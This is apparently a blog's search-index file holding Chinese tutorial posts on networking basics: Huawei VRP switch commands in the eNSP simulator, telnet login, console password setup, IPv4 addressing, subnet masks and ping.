href="#远程连接测试-1" class="headerlink" title="远程连接测试"></a>远程连接测试</h3><p><strong>需要支持telnet的客户端软件</strong></p><ul><li><p>第三方软件，如SecureCRT、Putty、Xshell等</p></li><li><p>路由器&#x2F;交换机自带telnet命令</p></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW1&gt;telnet</span> <span class="string">192.168.1.1                                     //telnet + 目标主机IP地址</span></span><br><span class="line"><span class="attr">Trying</span> <span class="string">192.168.1.1 ...</span></span><br><span class="line"><span class="attr">Press</span> <span class="string">CTRL+K to abort</span></span><br><span class="line"><span class="attr">Connected</span> <span class="string">to 192.168.1.1 ...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">Login</span> <span class="string">authentication</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">Password</span>:                                                  <span class="string">//输入密码</span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">The max number of VTY users is 5, and the number</span></span><br><span class="line">      <span class="attr">of</span> <span class="string">current VTY users on line is 1.</span></span><br><span class="line">      <span class="attr">The</span> <span class="string">current login time is 2023-11-23 19:57:58.</span></span><br><span class="line"><span class="attr">&lt;R1&gt;</span>                                                      <span class="string">//主机名已从SW1变为R1</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络应用基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络应用基础2</title>
      <link href="/posts/netbase2.html"/>
      <url>/posts/netbase2.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络应用基础2"><a href="#网络应用基础2" class="headerlink" title="网络应用基础2"></a>网络应用基础2</h1><h2 id="交换机介绍"><a href="#交换机介绍" class="headerlink" title="交换机介绍"></a>交换机介绍</h2><h3 id="什么是交换机"><a href="#什么是交换机" class="headerlink" title="什么是交换机"></a>什么是交换机</h3><p><strong>交换机，Switch</strong></p><ul><li>用于将多台计算机&#x2F;交换机连接到一起，组建网络</li><li>交换机负责为其中任意两台计算机提供独享线路进行通信</li><li>连接电脑组建局域网（组建局域网的主要设备）</li></ul><p><img src="/../img/img_artical/net_sec/1.2.1.png" alt="1.2.1"></p><h3 id="非网管型交换机"><a href="#非网管型交换机" class="headerlink" title="非网管型交换机"></a>非网管型交换机</h3><p><strong>也称为即插即用交换机</strong></p><ul><li>即插即用，无需（也不支持）对设备进行配置</li><li>使用简单、价格便宜（数百元）</li></ul><p><img src="/../img/img_artical/net_sec/1.2.2.png" alt="1.2.2"></p><h3 id="网管型交换机"><a href="#网管型交换机" class="headerlink" title="网管型交换机"></a>网管型交换机</h3><p><strong>也称为智能交换机</strong></p><ul><li>能够实现网段划分、流量控制等更多高级功能（隔离、限速、ACL、堆叠）</li><li>支持对设备做高级配置，价格也贵一些（数千元、数万元）</li></ul><p><img src="/../img/img_artical/net_sec/1.2.3.png" alt="1.2.3"></p><h2 id="部署eNSP平台"><a href="#部署eNSP平台" class="headerlink" title="部署eNSP平台"></a>部署eNSP平台</h2><h3 id="eNSP网络仿真平台介绍"><a href="#eNSP网络仿真平台介绍" class="headerlink" title="eNSP网络仿真平台介绍"></a>eNSP网络仿真平台介绍</h3><p><strong>华为研发的一款图形化网络仿真平台</strong></p><ul><li>便于ICT（信息通信技术）从业者快速熟悉华为产品</li><li>可以实现企业网络<strong>规划&#x2F;设计&#x2F;运维</strong>等相关操作，帮助使用者了解并掌握相关操作和配置</li></ul><h3 id="认识eNSP操作界面"><a href="#认识eNSP操作界面" class="headerlink" title="认识eNSP操作界面"></a>认识eNSP操作界面</h3><p><strong>拓扑绘制区</strong></p><p><strong>设备和线缆区</strong></p><p><img src="/../img/img_artical/net_sec/1.2.4.png" alt="1.2.4"></p><h2 id="交换机组网"><a href="#交换机组网" class="headerlink" title="交换机组网"></a>交换机组网</h2><h3 id="网路拓扑介绍"><a href="#网路拓扑介绍" class="headerlink" title="网路拓扑介绍"></a>网路拓扑介绍</h3><p><strong>教学部网段 192.168.1.0&#x2F;24</strong></p><ul><li>计算机pc1-1：IP地址192.168.1.1，掩码255.255.255.0</li><li>计算机pc1-2：IP地址192.168.1.2，掩码255.255.255.0</li><li>……</li></ul><p><img src="/../img/img_artical/net_sec/1.2.1.png" alt="1.2.5"></p><h3 id="绘制拓扑"><a href="#绘制拓扑" class="headerlink" title="绘制拓扑"></a>绘制拓扑</h3><p><strong>按照图例绘制简化版eNSP拓扑</strong></p><ul><li>1台交换机、2台PC机、2条网线</li><li>为方便识别，对每个设备、计算机重新命名</li></ul><p><img src="/../img/img_artical/net_sec/1.2.6.png" alt="1.2.6"></p><h3 id="交换组网的配置实现"><a href="#交换组网的配置实现" class="headerlink" title="交换组网的配置实现"></a>交换组网的配置实现</h3><p><strong>配置计算机PC1-1及PC1-2的IP地址及子网掩码</strong></p><p><img src="/../img/img_artical/net_sec/1.2.7.png" alt="1.2.7"></p><p><strong>结果验证</strong></p><ul><li><p>确认交换机LSW1、计算机PC1-1和PC1-2都已启动</p></li><li><p>从PC1-1能ping通PC1-2的IP地址，反之亦然</p></li></ul><p><img src="/../img/img_artical/net_sec/1.2.8.png" alt="1.2.8"></p><h2 id="交换机配置视图"><a href="#交换机配置视图" class="headerlink" title="交换机配置视图"></a>交换机配置视图</h2><h3 id="建立配置连接"><a href="#建立配置连接" class="headerlink" title="建立配置连接"></a>建立配置连接</h3><p><strong>软件连接：Putty、ServerCRT、Xshell等</strong></p><p><strong>硬件连接</strong></p><ul><li>计算机COM&#x2F;USB口 &#x3D;&gt; Console线 &#x3D;&gt; 交换机Console口</li></ul><p><img src="/../img/img_artical/net_sec/1.2.9.png" alt="1.2.9"></p><h3 id="几种命令行配置视图"><a href="#几种命令行配置视图" class="headerlink" title="几种命令行配置视图"></a>几种命令行配置视图</h3><p><strong>华为交换机内部是华为VRP（Versatile Routing Platform，通用路由平台）网络操作系统，该系统也用在路由器、防火墙等产品上</strong></p><p><img src="/../img/img_artical/net_sec/1.2.10.png" alt="1.2.10"></p><h3 id="切换不同视图"><a href="#切换不同视图" class="headerlink" title="切换不同视图"></a>切换不同视图</h3><p><strong>进入命令行终端时默认在用户视图，此时通过命令可切换视图</strong></p><ul><li>通过system-view、interface命令进行切换</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;Huawei&gt;</span>                                        <span class="string">//用户视图</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;system-view</span>                             <span class="string">//切换系统视图</span></span><br><span class="line"><span class="attr">[Huawei]</span>                                        <span class="string">//系统视图</span></span><br><span class="line"><span class="attr">[Huawei]interface</span> <span class="string">GigabitEthernet 0/0/1         //切换接口视图</span></span><br><span class="line"><span class="attr">[Huawei-GigabitEthernet0/0/1]</span>                   <span class="string">//接口视图</span></span><br></pre></td></tr></table></figure><p><strong>视图回退操作</strong></p><ul><li>退回到前一个视图：quit命令</li><li>快速返回到用户视图：return命令，或快捷键Ctrl + Z</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[Huawei-GigabitEthernet0/0/1]quit</span>     <span class="string">//返回上一个视图</span></span><br><span class="line"><span class="attr">[Huawei]</span></span><br><span class="line"><span class="attr">[Huawei]return</span>  <span class="string">//快速返回用户视图</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;</span></span><br></pre></td></tr></table></figure><h3 id="操作技巧"><a href="#操作技巧" class="headerlink" title="操作技巧"></a>操作技巧</h3><p><strong>命令行特性</strong></p><ul><li>命令可简写</li><li>按TAB键自动补全</li><li>按？能获取帮助信息</li><li>命令不区分大小写</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">//TAB补全</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;sys</span>                                       <span class="string">//按TAB补全</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">[Huawei]</span></span><br><span class="line"><span class="attr">//?获取帮助信息</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;sy?</span></span><br><span class="line">  <span class="attr">system-view</span>         <span class="string"></span></span><br><span class="line"><span class="attr">//简写</span>  <span class="string"></span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;sy</span>                                         <span class="string">//按回车</span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">//不区分大小写</span>    <span class="string"></span></span><br><span class="line"><span class="attr">[Huawei]QUIT</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;</span></span><br></pre></td></tr></table></figure><h2 id="命令行基本操作"><a href="#命令行基本操作" class="headerlink" title="命令行基本操作"></a>命令行基本操作</h2><h3 id="查看VRP系统版本"><a href="#查看VRP系统版本" class="headerlink" title="查看VRP系统版本"></a>查看VRP系统版本</h3><p><strong>display version命令</strong></p><ul><li>可显示系统版本、设备型号、已开机时间</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;Huawei&gt;display</span> <span class="string">version </span></span><br><span class="line"><span class="attr">Huawei</span> <span class="string">Versatile Routing Platform Software</span></span><br><span class="line"><span class="attr">VRP</span> <span class="string">(R) software, Version 5.110 (S5700 V200R001C00)           //系统版本、设备型号</span></span><br><span class="line"><span class="attr">Copyright</span> <span class="string">(c) 2000-2011 HUAWEI TECH CO., LTD</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Quidway</span> <span class="string">S5700-28C-HI Routing Switch uptime is 0 week, 0 day, 0 hour, 40 minutes      //开机时间</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;</span></span><br></pre></td></tr></table></figure><h3 id="查看当前交换机的配置"><a href="#查看当前交换机的配置" class="headerlink" title="查看当前交换机的配置"></a>查看当前交换机的配置</h3><p><strong>查看当前有效配置（display current-configuration）</strong></p><p><strong>查看当前视图配置（display this）</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;Huawei&gt;display</span> <span class="string">current-configuration                    //全部配置信息</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">sysname</span> <span class="string">Huawei</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">cluster</span> <span class="string">enable</span></span><br><span class="line"><span class="attr">ntdp</span> <span class="string">enable</span></span><br><span class="line"><span class="attr">ndp</span> <span class="string">enable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">..........</span></span><br><span class="line"><span class="attr">..........</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[Huawei]display</span> <span class="string">this                                     //查看当前视图配置</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">sysname</span> <span class="string">Huawei</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">cluster</span> <span class="string">enable</span></span><br><span class="line"><span class="attr">ntdp</span> <span class="string">enable</span></span><br><span class="line"><span class="attr">ndp</span> <span class="string">enable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">drop</span> <span class="string">illegal-mac alarm</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">return</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="配置设备名"><a href="#配置设备名" class="headerlink" title="配置设备名"></a>配置设备名</h3><p><strong>sysname命令</strong></p><ul><li><p>作用：可以在众多交换机中区分出来</p></li><li><p>命名规范：部门、位置、机架编号</p></li><li><p>需要在系统视图下执行</p></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;Huawei&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">[Huawei]sysname</span> <span class="string">SW1                              //将设备名改为SW1</span></span><br><span class="line"><span class="attr">[SW1]</span></span><br></pre></td></tr></table></figure><h3 id="保存交换机的配置"><a href="#保存交换机的配置" class="headerlink" title="保存交换机的配置"></a>保存交换机的配置</h3><p><strong>保存当前配置（save）</strong></p><ul><li>需要在用户视图下执行</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW1&gt;save</span></span><br><span class="line"><span class="attr">The</span> <span class="string">current configuration will be written to the device.</span></span><br><span class="line"><span class="attr">Are</span> <span class="string">you sure to continue?[Y/N]y                           //输入y确认</span></span><br><span class="line"><span class="attr">Save</span> <span class="string">the configuration successfully.  //保存成功</span></span><br></pre></td></tr></table></figure><h3 id="启用-禁用端口"><a href="#启用-禁用端口" class="headerlink" title="启用&#x2F;禁用端口"></a>启用&#x2F;禁用端口</h3><p><strong>默认自动开启，可以手动关闭以排查网络故障</strong></p><p><strong>在指定接口视图下</strong></p><ul><li>执行shutdown命令可以手动禁用此接口</li><li>执行undo shutdown命令可恢复启用此接口</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW1&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">[SW1]interface</span> <span class="string">GigabitEthernet 0/0/1</span></span><br><span class="line"><span class="attr">[SW1-GigabitEthernet0/0/1]shutdown</span>                   <span class="string">//关闭端口</span></span><br><span class="line"><span class="attr">[SW1-GigabitEthernet0/0/1]undo</span> <span class="string">shutdown              //启动端口</span></span><br></pre></td></tr></table></figure><p><strong>undo命令行一般用来恢复缺省状态、禁用某个功能或者删除某项配置</strong></p><h3 id="设置终端密码"><a href="#设置终端密码" class="headerlink" title="设置终端密码"></a>设置终端密码</h3><p><strong>默认交换机登录无需密码，为了安全需要添加认证密码</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW1&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">[SW1]user-interface</span> <span class="string">console 0                                  //进入用户接口console</span></span><br><span class="line"><span class="attr">[SW1-ui-console0]authentication-mode</span> <span class="string">password                  //启用密码认证</span></span><br><span class="line"><span class="attr">[SW1-ui-console0]set</span> <span class="string">authentication password simple 123456     //设置明文密码123456</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Login</span> <span class="string">authentication                                           //再次登录时需密码验证</span></span><br><span class="line"><span class="attr">Password</span>:<span class="string"></span></span><br><span class="line"><span class="attr">&lt;SW1&gt;</span></span><br></pre></td></tr></table></figure><p><strong>设置密码时需设置密码类型</strong></p><ul><li><p>simple为明文密码</p></li><li><p>cipher为密文密码</p></li><li><p>区别为明文密码在配置中可以看到，密文密码会被加密</p></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW1&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">[SW1]user-interface</span> <span class="string">console 0</span></span><br><span class="line"><span class="attr">[SW1-ui-console0]display</span> <span class="string">this</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">user-interface</span> <span class="string">con 0</span></span><br><span class="line"> <span class="attr">authentication-mode</span> <span class="string">password</span></span><br><span class="line"> <span class="attr">set</span> <span class="string">authentication password simple 123456                       //明文密码</span></span><br><span class="line"><span class="attr">user-interface</span> <span class="string">vty 0 4</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">return</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[SW1-ui-console0]set</span> <span class="string">authentication password cipher 123456</span></span><br><span class="line"><span class="attr">[SW1-ui-console0]display</span> <span class="string">this</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">user-interface</span> <span class="string">con 0</span></span><br><span class="line"> <span class="attr">authentication-mode</span> <span class="string">password</span></span><br><span class="line"> <span class="attr">set</span> <span class="string">authentication password cipher O|*dXi\0b)`S/0Rb&#123;DzN8qg#    //密文密码</span></span><br><span class="line"><span class="attr">user-interface</span> <span class="string">vty 0 4</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="attr">return</span></span><br></pre></td></tr></table></figure><h2 id="配置技巧"><a href="#配置技巧" class="headerlink" title="配置技巧"></a>配置技巧</h2><h3 id="取消终端提示消息"><a href="#取消终端提示消息" class="headerlink" title="取消终端提示消息"></a>取消终端提示消息</h3><p><strong>undo terminal monitor</strong></p><p><strong>配置命令会被终端界面一些提示消息打断，可以使用此命令关闭提示消息，只对当前终端有效，且重新登录时自动启动</strong></p><ul><li>只能在用户视图下配置<ul><li>初学者可以暂时取消这些提示消息</li></ul></li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW1&gt;undo</span> <span class="string">terminal monitor </span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">Current terminal monitor is off.</span></span><br></pre></td></tr></table></figure><h3 id="更改自动退出超时"><a href="#更改自动退出超时" class="headerlink" title="更改自动退出超时"></a>更改自动退出超时</h3><p><strong>终端会话默认超过10分钟会自动退出</strong></p><ul><li>调试设备时可以延长超时时间</li><li>为了安全调试完毕后需设置短时间</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW1&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">[SW1]user-interface</span> <span class="string">console 0</span></span><br><span class="line"><span class="attr">[SW1-ui-console0]idle-timeout</span> <span class="string">1440               //修改超时时间为1440分钟</span></span><br></pre></td></tr></table></figure><p><strong>如果设置为0的话则设备永不休眠</strong></p><h3 id="重启设备"><a href="#重启设备" class="headerlink" title="重启设备"></a>重启设备</h3><p><strong>reboot</strong></p><ul><li>在用户视图下执行，可重启当前设备</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW1&gt;reboot</span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">The system is now comparing the configuration, please wait.</span></span><br><span class="line"><span class="attr">Warning</span>: <span class="string">All the configuration will be saved to the configuration file for the n</span></span><br><span class="line"><span class="attr">ext</span> <span class="string">startup:flash:/vrpcfg.zip, Continue?[Y/N]:n                                       //如果交换机配置进行了修改则询问是否保存配置</span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">If want to reboot with saving diagnostic information, input &#x27;N&#x27; and then e</span></span><br><span class="line"><span class="attr">xecute</span> <span class="string">&#x27;reboot save diagnostic-information&#x27;.</span></span><br><span class="line"><span class="attr">System</span> <span class="string">will reboot! Continue?[Y/N]:y                                                  //确认是否进行重启</span></span><br></pre></td></tr></table></figure><p><strong>如果重启前未对配置进行修改则不会进行第一次确认</strong></p><h3 id="恢复出厂设置"><a href="#恢复出厂设置" class="headerlink" title="恢复出厂设置"></a>恢复出厂设置</h3><p><strong>reset saved-configuration</strong></p><ul><li>用户视图下执行，适用于系统配置紊乱&#x2F;错误、修复不便等情况</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;SW1&gt;reset</span> <span class="string">saved-configuration </span></span><br><span class="line"><span class="attr">Warning</span>: <span class="string">The action will delete the saved configuration in the device.</span></span><br><span class="line"><span class="attr">The</span> <span class="string">configuration will be erased to reconfigure. Continue? [Y/N]:y                  //提示恢复出厂设置将清空所有配置，是否继续</span></span><br><span class="line"><span class="attr">Warning</span>: <span class="string">Now clearing the configuration in the device.</span></span><br><span class="line"><span class="attr">Nov</span> <span class="string">23 2023 19:45:20-08:00 SW1 %%01CFM/4/RST_CFG(l)[0]:The user chose Y when dec</span></span><br><span class="line"><span class="attr">iding</span> <span class="string">whether to reset the saved configuration.</span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">Succeeded in clearing the configuration in the device.</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络应用基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络应用基础1</title>
      <link href="/posts/netbase1.html"/>
      <url>/posts/netbase1.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络应用基础"><a href="#网络应用基础" class="headerlink" title="网络应用基础"></a>网络应用基础</h1><h2 id="TCP-IP协议及配置"><a href="#TCP-IP协议及配置" class="headerlink" title="TCP&#x2F;IP协议及配置"></a>TCP&#x2F;IP协议及配置</h2><h3 id="TCP-IP协议概述"><a href="#TCP-IP协议概述" class="headerlink" title="TCP&#x2F;IP协议概述"></a>TCP&#x2F;IP协议概述</h3><p><strong>TCP&#x2F;IP协议族</strong></p><ul><li>计算机之间进行通信时必须共同遵循的一种通信规定</li><li>最广泛使用的通信协议的集合</li><li>包含大量Internet应用中的标准协议</li><li>支持跨网络结构、跨操作系统平台的数据通信</li></ul><p><strong>主机与主机之间通信的三要素</strong></p><ul><li>IP地址</li><li>子网掩码</li><li>默认网关</li></ul><h3 id="什么是IP地址"><a href="#什么是IP地址" class="headerlink" title="什么是IP地址"></a>什么是IP地址</h3><p><strong>用来标识一个网络节点的互联网地址</strong></p><p><strong>IPV4地址的组成</strong></p><ul><li>地址长度：32位</li><li>网络位+主机位</li></ul><h3 id="IPV4地址表示方式"><a href="#IPV4地址表示方式" class="headerlink" title="IPV4地址表示方式"></a>IPV4地址表示方式</h3><p><strong>点分十进制</strong></p><ul><li>4个十进制数（0~255）表示，以点隔开</li></ul><p><img src="/../img/img_artical/net_sec/1.1.1.png" alt="1.1.1"></p><h3 id="IP地址分类-网络规模"><a href="#IP地址分类-网络规模" class="headerlink" title="IP地址分类(网络规模)"></a>IP地址分类(网络规模)</h3><p><strong>常用的IP地址</strong></p><ul><li>A类：0 ~ 127         超大型网络      <font color=#ff0000>网</font>.主.主.主</li><li>B类：128 ~ 191       大型网络        <font color=#ff0000>网</font>.<font color=#ff0000>网</font>.主.主</li><li>C类：192 ~ 223       中小型网络      <font color=#ff0000>网</font>.<font color=#ff0000>网</font>.<font color=#ff0000>网</font>.主</li></ul><p><strong>组播及科研专用</strong></p><ul><li>D类：224 ~ 239       组播网络          </li><li>E类： 240 ~ 255       科研网络</li></ul><table><thead><tr><th>类别</th><th>IP范围</th></tr></thead><tbody><tr><td>A类</td><td><font color=#ff0000>0</font>.0.0.0 ~  <font color=#ff0000>127</font>.255.255.255</td></tr><tr><td>B类</td><td><font color=#ff0000>128</font>.<font color=#ff0000>0</font>.0.0 ~  <font color=#ff0000>191</font>.<font color=#ff0000>255</font>.255.255</td></tr><tr><td>C类</td><td><font color=#ff0000>192</font>.<font color=#ff0000>0</font>.<font color=#ff0000>0</font>.0 ~  <font color=#ff0000>223</font>.<font color=#ff0000>255</font>.<font color=#ff0000>255</font>.255</td></tr></tbody></table><h3 id="什么是子网掩码"><a href="#什么是子网掩码" class="headerlink" title="什么是子网掩码"></a>什么是子网掩码</h3><p><strong>判断IP地址的网络位，相同网络位的IP地址可以直接通信</strong></p><p><strong>不能单独存在，必须结合IP地址一起使用</strong></p><p><strong>默认子网掩码</strong></p><ul><li>A类：255.0.0.0        <font color=#ff0000>网</font>.主.主.主</li><li>B类：255.255.0.0      <font color=#ff0000>网</font>.<font color=#ff0000>网</font>.主.主</li><li>C类：255.255.255.0    <font color=#ff0000>网</font>.<font color=#ff0000>网</font>.<font color=#ff0000>网</font>.主</li></ul><h3 id="默认网关"><a href="#默认网关" class="headerlink" title="默认网关"></a>默认网关</h3><p><strong>什么是网关</strong></p><ul><li><p>从一个网段连接另一个网段的”关口”</p></li><li><p>通常是一台路由器或者防火墙&#x2F;接入服务器的地址</p></li></ul><p><img src="/../img/img_artical/net_sec/1.1.2.png" alt="1.1.2"></p><h3 id="IP地址使用场景"><a href="#IP地址使用场景" class="headerlink" title="IP地址使用场景"></a>IP地址使用场景</h3><p><strong>根据使用范围区分：</strong></p><ul><li>公有地址：可以在互联网合法使用，需要向NIC付费申请，全球唯一</li><li>私有地址：预留给企业内部使用，无需付费，局域网唯一</li></ul><table><thead><tr><th align="center">类别</th><th align="center">私有IP范围</th></tr></thead><tbody><tr><td align="center">A类</td><td align="center"><font color="#ff0000">10</font>.0.0.0 ~ <font color="#ff0000">10</font>.255.255.255</td></tr><tr><td align="center">B类</td><td align="center"><font color="#ff0000">172.16</font>.0.0 ~ <font color="#ff0000">172.31</font>.255.255</td></tr><tr><td align="center">C类</td><td align="center"><font color="#ff0000">192.168</font>.0.0 ~ <font color="#ff0000">192.168</font>.255.255</td></tr></tbody></table><p><strong>注：所有的IP地址都由国际组织NIC(Network Information Center)负责统一分配，截止2019年11月26日,全球IPv4地址已经正式用尽了，128位的IPv6地址正在逐步普及。</strong></p><h3 id="查看IP地址参数"><a href="#查看IP地址参数" class="headerlink" title="查看IP地址参数"></a>查看IP地址参数</h3><p><strong>设置 &#x3D;&gt; 网络和Internet &#x3D;&gt; 以太网</strong></p><ul><li>找到”本地连接”或”Ethernet0”，打开即可查看</li></ul><p><img src="/../img/img_artical/net_sec/1.1.3.png" alt="1.1.3"></p><p><strong>Win + R键调出运行窗口，输入cmd打开命令窗口</strong></p><p><strong>执行ipconfig命令</strong></p><ul><li>获得IP地址、子网掩码、默认网关等信息</li><li>&#x2F;all选项可以查看更详细的DNS服务器、物理地址（MAC地址）等信息</li></ul><p><img src="/../img/img_artical/net_sec/1.1.4.png" alt="1.1.4"></p><h3 id="测试网络连通性"><a href="#测试网络连通性" class="headerlink" title="测试网络连通性"></a>测试网络连通性</h3><p><strong>ping命令</strong></p><ul><li>向目标主机发送数据包，根据反馈结果判断网络连通性。</li></ul><p><img src="/../img/img_artical/net_sec/1.1.5.png" alt="1.1.5"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络应用基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
